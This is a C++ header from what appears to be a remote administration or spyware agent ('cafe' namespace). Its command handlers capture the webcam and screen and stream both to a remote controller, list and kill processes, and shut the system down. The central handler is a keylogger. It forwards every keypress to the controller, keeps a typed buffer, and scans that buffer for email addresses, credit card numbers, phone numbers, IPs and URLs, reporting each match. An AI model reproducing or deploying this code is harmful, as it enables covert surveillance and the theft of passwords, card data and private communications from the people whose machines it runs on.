#pragma once

#include "capture/screen_capture.hpp"
#include "capture/webcam_capture.hpp"
#include "commands/command_registry.hpp"
#include "core/interfaces.hpp"
#include "services/keyboard_service.hpp"
#include "services/streaming_service.hpp"
#include "services/system_service.hpp"
#include <memory>
#include <mutex>
#include <regex>

namespace cafe {

// ============================================================================
// Capture Commands
// ============================================================================

/**
 * @brief Handler for single webcam frame capture
 */
class CaptureWebcamHandler : public ICommandHandler {
public:
    explicit CaptureWebcamHandler(std::shared_ptr<WebcamCapture> webcam)
        : webcam_(std::move(webcam)) {}

    std::string getCommand() const override { return "capture_webcam"; }
    
    bool canHandle(const std::string& cmd) const override {
        return cmd == "capture_webcam";
    }

    void execute(const std::string&, CommandContext& ctx) override {
        auto frame = webcam_->captureFrame();
        if (!frame.empty()) {
            ctx.sender.sendBinary(frame);
            ctx.logger.debug("Webcam frame captured: " + std::to_string(frame.size()) + " bytes");
        } else {
            ctx.sender.sendText("Error: Failed to capture webcam frame");
        }
    }

private:
    std::shared_ptr<WebcamCapture> webcam_;
};

/**
 * @brief Handler for single screen capture
 */
class CaptureScreenHandler : public ICommandHandler {
public:
    explicit CaptureScreenHandler(std::shared_ptr<ScreenCapture> screen)
        : screen_(std::move(screen)) {}

    std::string getCommand() const override { return "frame_capture"; }
    
    bool canHandle(const std::string& cmd) const override {
        return cmd == "frame_capture";
    }

    void execute(const std::string&, CommandContext& ctx) override {
        auto frame = screen_->captureFrame();
        if (!frame.empty()) {
            ctx.sender.sendBinary(frame);
            ctx.logger.debug("Screen frame captured: " + std::to_string(frame.size()) + " bytes");
        } else {
            ctx.sender.sendText("Error: Failed to capture screen (GNOME Wayland restriction?)");
        }
    }

private:
    std::shared_ptr<ScreenCapture> screen_;
};

// ============================================================================
// Streaming Commands
// ============================================================================

/**
 * @brief Handler for starting webcam stream
 */
class StartWebcamStreamHandler : public ICommandHandler {
public:
    explicit StartWebcamStreamHandler(std::shared_ptr<StreamingService> service)
        : service_(std::move(service)) {}

    std::string getCommand() const override { return "start_webcam_stream"; }
    
    bool canHandle(const std::string& cmd) const override {
        return cmd == "start_webcam_stream" || cmd == "start_stream";
    }

    void execute(const std::string&, CommandContext& ctx) override {
        if (service_->isStreaming()) {
            ctx.sender.sendText("Stream already running");
            return;
        }
        service_->startStream(ctx.sender, 30);
        ctx.sender.sendText("Webcam stream started");
        ctx.logger.info("Webcam streaming started");
    }

private:
    std::shared_ptr<StreamingService> service_;
};

/**
 * @brief Handler for starting screen stream
 */
class StartScreenStreamHandler : public ICommandHandler {
public:
    explicit StartScreenStreamHandler(std::shared_ptr<StreamingService> service)
        : service_(std::move(service)) {}

    std::string getCommand() const override { return "start_screen_stream"; }
    
    bool canHandle(const std::string& cmd) const override {
        return cmd == "start_screen_stream";
    }

    void execute(const std::string&, CommandContext& ctx) override {
        if (service_->isStreaming()) {
            ctx.sender.sendText("Stream already running");
            return;
        }
        service_->startStream(ctx.sender, 30);
        ctx.sender.sendText("Screen stream started");
        ctx.logger.info("Screen streaming started");
    }

private:
    std::shared_ptr<StreamingService> service_;
};

/**
 * @brief Handler for stopping any stream
 */
class StopStreamHandler : public ICommandHandler {
public:
    StopStreamHandler(std::shared_ptr<StreamingService> webcamService,
                      std::shared_ptr<StreamingService> screenService)
        : webcamService_(std::move(webcamService))
        , screenService_(std::move(screenService)) {}

    std::string getCommand() const override { return "stop_stream"; }
    
    bool canHandle(const std::string& cmd) const override {
        return cmd == "stop_stream";
    }

    void execute(const std::string&, CommandContext& ctx) override {
        webcamService_->stopStream();
        screenService_->stopStream();
        ctx.sender.sendText("Stream stopped");
        ctx.logger.info("Streaming stopped");
    }

private:
    std::shared_ptr<StreamingService> webcamService_;
    std::shared_ptr<StreamingService> screenService_;
};

// ============================================================================
// Keylogger Commands
// ============================================================================

/**
 * @brief Handler for keylogger operations with regex pattern detection
 */
class KeyloggerHandler : public ICommandHandler {
public:
    explicit KeyloggerHandler(std::shared_ptr<IKeyboardListener> keyboard)
        : keyboard_(std::move(keyboard)) {}

    std::string getCommand() const override { return "start_keylogger"; }
    
    bool canHandle(const std::string& cmd) const override {
        return cmd == "start_keylogger" || 
               cmd == "stop_keylogger" ||
               cmd.rfind("add_pattern:", 0) == 0 ||
               cmd.rfind("remove_pattern:", 0) == 0 ||
               cmd == "clear_patterns" ||
               cmd == "add_common_patterns" ||
               cmd == "get_typed_buffer" ||
               cmd == "clear_buffer";
    }

    void execute(const std::string& cmd, CommandContext& ctx) override {
        if (cmd == "start_keylogger") {
            startKeylogger(ctx);
        } else if (cmd == "stop_keylogger") {
            stopKeylogger(ctx);
        } else if (cmd.rfind("add_pattern:", 0) == 0) {
            addPattern(cmd.substr(12), ctx);
        } else if (cmd.rfind("remove_pattern:", 0) == 0) {
            removePattern(cmd.substr(15), ctx);
        } else if (cmd == "clear_patterns") {
            clearPatterns(ctx);
        } else if (cmd == "add_common_patterns") {
            addCommonPatterns(ctx);
        } else if (cmd == "get_typed_buffer") {
            getTypedBuffer(ctx);
        } else if (cmd == "clear_buffer") {
            clearBuffer(ctx);
        }
    }

private:
    std::shared_ptr<IKeyboardListener> keyboard_;
    std::mutex sendMutex_;
    
    // Regex patterns storage
    std::vector<std::pair<std::string, std::regex>> patterns_;
    std::mutex patternMutex_;
    std::string typedBuffer_;
    size_t maxBufferSize_ = 1000;
    std::atomic<bool> shiftPressed_{false};
    std::atomic<bool> capsLock_{false};
    
    // Convert keycode to character
    static char keycodeToChar(int code, bool shift) {
        // Numbers
        if (code >= 2 && code <= 11) {
            if (shift) {
                static const char shiftNums[] = "!@#$%^&*()";
                return shiftNums[code - 2];
            }
            return (code == 11) ? '0' : ('1' + code - 2);
        }
        
        // Letters
        static const char letters[] = "qwertyuiopasdfghjklzxcvbnm";
        static const int codes[] = {16,17,18,19,20,21,22,23,24,25,30,31,32,33,34,35,36,37,38,44,45,46,47,48,49,50};
        for (int i = 0; i < 26; i++) {
            if (code == codes[i]) {
                return shift ? (letters[i] - 32) : letters[i];
            }
        }
        
        // Special chars
        switch (code) {
            case 57: return ' ';
            case 12: return shift ? '_' : '-';
            case 13: return shift ? '+' : '=';
            case 26: return shift ? '{' : '[';
            case 27: return shift ? '}' : ']';
            case 39: return shift ? ':' : ';';
            case 40: return shift ? '"' : '\'';
            case 41: return shift ? '~' : '`';
            case 43: return shift ? '|' : '\\';
            case 51: return shift ? '<' : ',';
            case 52: return shift ? '>' : '.';
            case 53: return shift ? '?' : '/';
        }
        return 0;
    }
    
    void checkPatterns(CommandContext& ctx) {
        std::lock_guard<std::mutex> lock(patternMutex_);
        for (const auto& [name, pattern] : patterns_) {
            std::smatch match;
            std::string bufCopy = typedBuffer_;
            while (std::regex_search(bufCopy, match, pattern)) {
                std::lock_guard<std::mutex> slock(sendMutex_);
                ctx.sender.sendText("PATTERN:" + name + ":" + match.str());
                bufCopy = match.suffix();
            }
        }
    }
    
    void processKeyEvent(int code, int value, CommandContext& ctx) {
        // Track shift
        if (code == 42 || code == 54) {
            shiftPressed_ = (value != 0);
            return;
        }
        
        // Track caps lock
        if (code == 58 && value == 1) {
            capsLock_ = !capsLock_;
            return;
        }
        
        if (value != 1) return; // Only key press
        
        // Backspace
        if (code == 14) {
            std::lock_guard<std::mutex> lock(patternMutex_);
            if (!typedBuffer_.empty()) {
                typedBuffer_.pop_back();
            }
            return;
        }
        
        // Convert to char
        bool effectiveShift = shiftPressed_ ^ capsLock_;
        char c = keycodeToChar(code, effectiveShift);
        
        if (c != 0) {
            std::lock_guard<std::mutex> lock(patternMutex_);
            typedBuffer_ += c;
            
            if (typedBuffer_.size() > maxBufferSize_) {
                typedBuffer_ = typedBuffer_.substr(typedBuffer_.size() - maxBufferSize_ / 2);
            }
        }
        
        // Check patterns on space/enter or periodically
        if (code == 28 || code == 57 || typedBuffer_.size() % 5 == 0) {
            checkPatterns(ctx);
        }
    }

    void startKeylogger(CommandContext& ctx) {
        if (keyboard_->isRunning()) {
            ctx.sender.sendText("Keylogger already running");
            return;
        }

        keyboard_->setCallback([this, &ctx](int code, int value, const char* name) {
            // Process for pattern matching
            processKeyEvent(code, value, ctx);
            
            // Send key event
            if (value == 1) {
                std::lock_guard<std::mutex> lock(sendMutex_);
                char buf[128];
                snprintf(buf, sizeof(buf), "KEY:%s (%d)", name, code);
                ctx.sender.sendText(buf);
            }
        });

        if (keyboard_->start()) {
            ctx.sender.sendText("Keylogger started");
            ctx.logger.info("Keylogger started");
        } else {
            ctx.sender.sendText("Failed to start keylogger (need root?)");
            ctx.logger.error("Failed to start keylogger");
        }
    }

    void stopKeylogger(CommandContext& ctx) {
        keyboard_->stop();
        ctx.sender.sendText("Keylogger stopped");
        ctx.logger.info("Keylogger stopped");
    }
    
    void addPattern(const std::string& data, CommandContext& ctx) {
        // Format: name:regex
        auto pos = data.find(':');
        if (pos == std::string::npos) {
            ctx.sender.sendText("Error: Format is add_pattern:name:regex");
            return;
        }
        
        std::string name = data.substr(0, pos);
        std::string regex = data.substr(pos + 1);
        
        try {
            std::lock_guard<std::mutex> lock(patternMutex_);
            patterns_.emplace_back(name, std::regex(regex, std::regex::icase));
            ctx.sender.sendText("Pattern added: " + name);
            ctx.logger.info("Added pattern: " + name + " = " + regex);
        } catch (const std::regex_error& e) {
            ctx.sender.sendText("Error: Invalid regex - " + std::string(e.what()));
        }
    }
    
    void removePattern(const std::string& name, CommandContext& ctx) {
        std::lock_guard<std::mutex> lock(patternMutex_);
        auto it = std::remove_if(patterns_.begin(), patterns_.end(),
            [&name](const auto& p) { return p.first == name; });
        if (it != patterns_.end()) {
            patterns_.erase(it, patterns_.end());
            ctx.sender.sendText("Pattern removed: " + name);
        } else {
            ctx.sender.sendText("Pattern not found: " + name);
        }
    }
    
    void clearPatterns(CommandContext& ctx) {
        std::lock_guard<std::mutex> lock(patternMutex_);
        patterns_.clear();
        ctx.sender.sendText("All patterns cleared");
    }
    
    void addCommonPatterns(CommandContext& ctx) {
        std::lock_guard<std::mutex> lock(patternMutex_);
        patterns_.clear();
        
        // Email
        patterns_.emplace_back("email", 
            std::regex(R"([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})", std::regex::icase));
        // Credit card
        patterns_.emplace_back("credit_card", 
            std::regex(R"(\b\d{4}[-\s]?\d{4}[-\s]?\d{4}[-\s]?\d{4}\b)"));
        // Phone
        patterns_.emplace_back("phone", 
            std::regex(R"(\b(\+\d{1,3}[-\s]?)?\(?\d{3}\)?[-\s]?\d{3}[-\s]?\d{4}\b)"));
        // IP address
        patterns_.emplace_back("ip_address", 
            std::regex(R"(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)"));
        // URL
        patterns_.emplace_back("url", 
            std::regex(R"(https?://[^\s]+)", std::regex::icase));
        
        ctx.sender.sendText("Common patterns added: email, credit_card, phone, ip_address, url");
    }
    
    void getTypedBuffer(CommandContext& ctx) {
        std::lock_guard<std::mutex> lock(patternMutex_);
        ctx.sender.sendText("BUFFER:" + typedBuffer_);
    }
    
    void clearBuffer(CommandContext& ctx) {
        std::lock_guard<std::mutex> lock(patternMutex_);
        typedBuffer_.clear();
        ctx.sender.sendText("Buffer cleared");
    }
};

// ============================================================================
// Process Commands
// ============================================================================

/**
 * @brief Handler for listing processes
 */
class ListProcessHandler : public ICommandHandler {
public:
    explicit ListProcessHandler(std::shared_ptr<IProcessManager> procMgr)
        : procMgr_(std::move(procMgr)) {}

    std::string getCommand() const override { return "list_process"; }
    
    bool canHandle(const std::string& cmd) const override {
        return cmd == "list_process";
    }

    void execute(const std::string&, CommandContext& ctx) override {
        ctx.sender.sendText(procMgr_->listProcesses());
    }

private:
    std::shared_ptr<IProcessManager> procMgr_;
};

/**
 * @brief Handler for killing processes
 */
class KillProcessHandler : public ICommandHandler {
public:
    explicit KillProcessHandler(std::shared_ptr<IProcessManager> procMgr)
        : procMgr_(std::move(procMgr)) {}

    std::string getCommand() const override { return "kill_process"; }
    
    bool canHandle(const std::string& cmd) const override {
        return cmd.rfind("kill_process:", 0) == 0;
    }

    void execute(const std::string& cmd, CommandContext& ctx) override {
        std::string pidStr = cmd.substr(13); // "kill_process:" is 13 chars
        try {
            int pid = std::stoi(pidStr);
            if (procMgr_->killProcess(pid)) {
                ctx.sender.sendText("Process " + pidStr + " killed");
                ctx.logger.info("Killed process " + pidStr);
            } else {
                ctx.sender.sendText("Failed to kill process " + pidStr);
            }
        } catch (...) {
            ctx.sender.sendText("Invalid PID: " + pidStr);
        }
    }

private:
    std::shared_ptr<IProcessManager> procMgr_;
};

// ============================================================================
// System Commands
// ============================================================================

/**
 * @brief Handler for system shutdown
 */
class ShutdownHandler : public ICommandHandler {
public:
    explicit ShutdownHandler(std::shared_ptr<ISystemController> sysCtrl)
        : sysCtrl_(std::move(sysCtrl)) {}

    std::string getCommand() const override { return "shutdown"; }
    
    bool canHandle(const std::string& cmd) const override {
        return cmd == "shutdown";
    }

    void execute(const std::string&, CommandContext& ctx) override {
        ctx.sender.sendText("Shutting down...");
        ctx.logger.info("System shutdown initiated");
        sysCtrl_->shutdown();
    }

private:
    std::shared_ptr<ISystemController> sysCtrl_;
};

} // namespace cafe
